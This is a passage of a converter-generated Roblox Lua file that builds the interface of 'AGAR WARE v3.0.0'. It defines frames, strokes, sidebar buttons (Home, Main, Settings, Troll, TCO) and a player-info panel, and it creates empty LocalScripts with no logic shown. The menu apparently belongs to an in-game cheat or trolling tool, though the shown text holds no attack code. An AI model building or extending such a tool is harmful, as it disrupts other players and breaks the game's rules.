--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 820 | Scripts: 33 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.T5784YHRGE89ES98T
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["DisplayOrder"] = 1999999999;
G2L["1"]["Name"] = [[T5784YHRGE89ES98T]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.T5784YHRGE89ES98T.mainScript
G2L["2"] = Instance.new("LocalScript", G2L["1"]);
G2L["2"]["Name"] = [[mainScript]];


-- StarterGui.T5784YHRGE89ES98T.guicolor
G2L["3"] = Instance.new("LocalScript", G2L["1"]);
G2L["3"]["Name"] = [[guicolor]];


-- StarterGui.T5784YHRGE89ES98T.startupScript
G2L["4"] = Instance.new("LocalScript", G2L["1"]);
G2L["4"]["Name"] = [[startupScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame
G2L["5"] = Instance.new("Frame", G2L["1"]);
G2L["5"]["ZIndex"] = 1000000000;
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["5"]["Size"] = UDim2.new(0, 450, 0, 300);
G2L["5"]["Position"] = UDim2.new(0.25851, 0, 0.16374, 0);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Name"] = [[MainFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.itsthisone
G2L["6"] = Instance.new("TextLabel", G2L["5"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextSize"] = 14;
G2L["6"]["TextTransparency"] = 1;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["6"]["Visible"] = false;
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Name"] = [[itsthisone]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.GuiColor
G2L["7"] = Instance.new("UIStroke", G2L["5"]);
G2L["7"]["ZIndex"] = 99;
G2L["7"]["Color"] = Color3.fromRGB(0, 124, 255);
G2L["7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["7"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.blackstroke
G2L["8"] = Instance.new("UIStroke", G2L["5"]);
G2L["8"]["Thickness"] = 2;
G2L["8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["8"]["Name"] = [[blackstroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar
G2L["9"] = Instance.new("Frame", G2L["5"]);
G2L["9"]["ZIndex"] = 99;
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["Size"] = UDim2.new(0, 450, 0, 20);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Name"] = [[topbar]];
G2L["9"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.topbarScript
G2L["a"] = Instance.new("LocalScript", G2L["9"]);
G2L["a"]["Name"] = [[topbarScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.text
G2L["b"] = Instance.new("TextLabel", G2L["9"]);
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 11;
G2L["b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["RichText"] = true;
G2L["b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[AGAR WARE | v3.0.0 | fps X.X | Xms | server: X/X]];
G2L["b"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.text.text
G2L["c"] = Instance.new("UIStroke", G2L["b"]);
G2L["c"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.UIPadding
G2L["d"] = Instance.new("UIPadding", G2L["9"]);
G2L["d"]["PaddingLeft"] = UDim.new(0, 7);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.minimise
G2L["e"] = Instance.new("TextButton", G2L["9"]);
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["TextSize"] = 14;
G2L["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["ZIndex"] = 9999;
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Size"] = UDim2.new(0, 60, 0, 20);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[-]];
G2L["e"]["Name"] = [[minimise]];
G2L["e"]["Position"] = UDim2.new(0.86451, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.minimise.text
G2L["f"] = Instance.new("UIStroke", G2L["e"]);
G2L["f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe
G2L["10"] = Instance.new("Frame", G2L["5"]);
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["10"]["Size"] = UDim2.new(0, 440, 0, 275);
G2L["10"]["Position"] = UDim2.new(0, 5, 0, 20);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Name"] = [[innerframe]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.greystroke
G2L["11"] = Instance.new("UIStroke", G2L["10"]);
G2L["11"]["ZIndex"] = 99;
G2L["11"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["11"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["11"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar
G2L["12"] = Instance.new("Frame", G2L["10"]);
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["12"]["Size"] = UDim2.new(0, 60, 0, 265);
G2L["12"]["Position"] = UDim2.new(0, 5, 0, 5);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Name"] = [[sidebar]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.greystroke
G2L["13"] = Instance.new("UIStroke", G2L["12"]);
G2L["13"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["13"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["13"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling
G2L["14"] = Instance.new("ScrollingFrame", G2L["12"]);
G2L["14"]["Active"] = true;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["ScrollingEnabled"] = false;
G2L["14"]["Name"] = [[sidebarScrolling]];
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["Size"] = UDim2.new(0, 60, 0, 265);
G2L["14"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["ScrollBarThickness"] = 0;
G2L["14"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.pagehandler
G2L["15"] = Instance.new("LocalScript", G2L["14"]);
G2L["15"]["Name"] = [[pagehandler]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home
G2L["16"] = Instance.new("TextButton", G2L["14"]);
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextTransparency"] = 1;
G2L["16"]["TextSize"] = 14;
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["Size"] = UDim2.new(0, 60, 0, 22);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[]];
G2L["16"]["Name"] = [[Home]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home.greystroke
G2L["17"] = Instance.new("UIStroke", G2L["16"]);
G2L["17"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["17"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["17"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home.text
G2L["18"] = Instance.new("TextLabel", G2L["16"]);
G2L["18"]["ZIndex"] = 2;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextSize"] = 12;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundTransparency"] = 1;
G2L["18"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[Home]];
G2L["18"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home.text.text
G2L["19"] = Instance.new("UIStroke", G2L["18"]);
G2L["19"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home.buttonFade
G2L["1a"] = Instance.new("CanvasGroup", G2L["16"]);
G2L["1a"]["BorderSizePixel"] = 0;
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home.buttonFade.UIGradient
G2L["1b"] = Instance.new("UIGradient", G2L["1a"]);
G2L["1b"]["Rotation"] = 90;
G2L["1b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.UIListLayout
G2L["1c"] = Instance.new("UIListLayout", G2L["14"]);
G2L["1c"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main
G2L["1d"] = Instance.new("TextButton", G2L["14"]);
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextTransparency"] = 1;
G2L["1d"]["TextSize"] = 14;
G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d"]["Size"] = UDim2.new(0, 60, 0, 22);
G2L["1d"]["LayoutOrder"] = 2;
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[]];
G2L["1d"]["Name"] = [[Main]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main.greystroke
G2L["1e"] = Instance.new("UIStroke", G2L["1d"]);
G2L["1e"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["1e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1e"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main.text
G2L["1f"] = Instance.new("TextLabel", G2L["1d"]);
G2L["1f"]["ZIndex"] = 2;
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["TextSize"] = 12;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["BackgroundTransparency"] = 1;
G2L["1f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[Main]];
G2L["1f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main.text.text
G2L["20"] = Instance.new("UIStroke", G2L["1f"]);
G2L["20"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main.buttonFade
G2L["21"] = Instance.new("CanvasGroup", G2L["1d"]);
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main.buttonFade.UIGradient
G2L["22"] = Instance.new("UIGradient", G2L["21"]);
G2L["22"]["Rotation"] = 90;
G2L["22"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings
G2L["23"] = Instance.new("TextButton", G2L["14"]);
G2L["23"]["BorderSizePixel"] = 0;
G2L["23"]["TextTransparency"] = 1;
G2L["23"]["TextSize"] = 14;
G2L["23"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["Size"] = UDim2.new(0, 60, 0, 22);
G2L["23"]["LayoutOrder"] = 1;
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Text"] = [[]];
G2L["23"]["Name"] = [[Settings]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings.greystroke
G2L["24"] = Instance.new("UIStroke", G2L["23"]);
G2L["24"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["24"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["24"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings.text
G2L["25"] = Instance.new("TextLabel", G2L["23"]);
G2L["25"]["ZIndex"] = 2;
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["TextSize"] = 12;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["BackgroundTransparency"] = 1;
G2L["25"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Text"] = [[Settings]];
G2L["25"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings.text.text
G2L["26"] = Instance.new("UIStroke", G2L["25"]);
G2L["26"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings.buttonFade
G2L["27"] = Instance.new("CanvasGroup", G2L["23"]);
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings.buttonFade.UIGradient
G2L["28"] = Instance.new("UIGradient", G2L["27"]);
G2L["28"]["Rotation"] = 90;
G2L["28"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll
G2L["29"] = Instance.new("TextButton", G2L["14"]);
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["TextTransparency"] = 1;
G2L["29"]["TextSize"] = 14;
G2L["29"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29"]["Size"] = UDim2.new(0, 60, 0, 22);
G2L["29"]["LayoutOrder"] = 3;
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["Text"] = [[]];
G2L["29"]["Name"] = [[Troll]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll.greystroke
G2L["2a"] = Instance.new("UIStroke", G2L["29"]);
G2L["2a"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["2a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2a"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll.text
G2L["2b"] = Instance.new("TextLabel", G2L["29"]);
G2L["2b"]["ZIndex"] = 2;
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["TextSize"] = 12;
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["BackgroundTransparency"] = 1;
G2L["2b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Text"] = [[Troll]];
G2L["2b"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll.text.text
G2L["2c"] = Instance.new("UIStroke", G2L["2b"]);
G2L["2c"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll.buttonFade
G2L["2d"] = Instance.new("CanvasGroup", G2L["29"]);
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll.buttonFade.UIGradient
G2L["2e"] = Instance.new("UIGradient", G2L["2d"]);
G2L["2e"]["Rotation"] = 90;
G2L["2e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain
G2L["2f"] = Instance.new("TextButton", G2L["14"]);
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["TextTransparency"] = 1;
G2L["2f"]["TextSize"] = 14;
G2L["2f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2f"]["Size"] = UDim2.new(0, 60, 0, 22);
G2L["2f"]["LayoutOrder"] = 1;
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["Text"] = [[]];
G2L["2f"]["Name"] = [[TCOMain]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain.greystroke
G2L["30"] = Instance.new("UIStroke", G2L["2f"]);
G2L["30"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["30"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["30"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain.text
G2L["31"] = Instance.new("TextLabel", G2L["2f"]);
G2L["31"]["ZIndex"] = 2;
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextSize"] = 12;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["BackgroundTransparency"] = 1;
G2L["31"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Text"] = [[TCO]];
G2L["31"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain.text.text
G2L["32"] = Instance.new("UIStroke", G2L["31"]);
G2L["32"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain.buttonFade
G2L["33"] = Instance.new("CanvasGroup", G2L["2f"]);
G2L["33"]["BorderSizePixel"] = 0;
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["33"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain.buttonFade.UIGradient
G2L["34"] = Instance.new("UIGradient", G2L["33"]);
G2L["34"]["Rotation"] = 90;
G2L["34"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea
G2L["35"] = Instance.new("Frame", G2L["10"]);
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(19, 19, 19);
G2L["35"]["Size"] = UDim2.new(0, 370, 0, 265);
G2L["35"]["Position"] = UDim2.new(0, 65, 0, 5);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Name"] = [[contentarea]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.greystroke
G2L["36"] = Instance.new("UIStroke", G2L["35"]);
G2L["36"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["36"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["36"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home
G2L["37"] = Instance.new("ScrollingFrame", G2L["35"]);
G2L["37"]["Visible"] = false;
G2L["37"]["Active"] = true;
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
G2L["37"]["Name"] = [[Home]];
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["Size"] = UDim2.new(0, 360, 0, 255);
G2L["37"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["ScrollBarThickness"] = 0;
G2L["37"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.rightside
G2L["38"] = Instance.new("Frame", G2L["37"]);
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["38"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Name"] = [[rightside]];
G2L["38"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.rightside.UIListLayout
G2L["39"] = Instance.new("UIListLayout", G2L["38"]);
G2L["39"]["Padding"] = UDim.new(0, 5);
G2L["39"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside
G2L["3a"] = Instance.new("Frame", G2L["37"]);
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["3a"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Name"] = [[leftside]];
G2L["3a"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.UIListLayout
G2L["3b"] = Instance.new("UIListLayout", G2L["3a"]);
G2L["3b"]["Padding"] = UDim.new(0, 5);
G2L["3b"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab
G2L["3c"] = Instance.new("Frame", G2L["3a"]);
G2L["3c"]["BorderSizePixel"] = 0;
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["3c"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["Name"] = [[playerinfoTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfoScript
G2L["3d"] = Instance.new("LocalScript", G2L["3c"]);
G2L["3d"]["Name"] = [[playerinfoScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.UIListLayout
G2L["3e"] = Instance.new("UIListLayout", G2L["3c"]);
G2L["3e"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["3e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.greystroke
G2L["3f"] = Instance.new("UIStroke", G2L["3c"]);
G2L["3f"]["ZIndex"] = 99;
G2L["3f"]["Color"] = Color3.fromRGB(51, 51, 51);
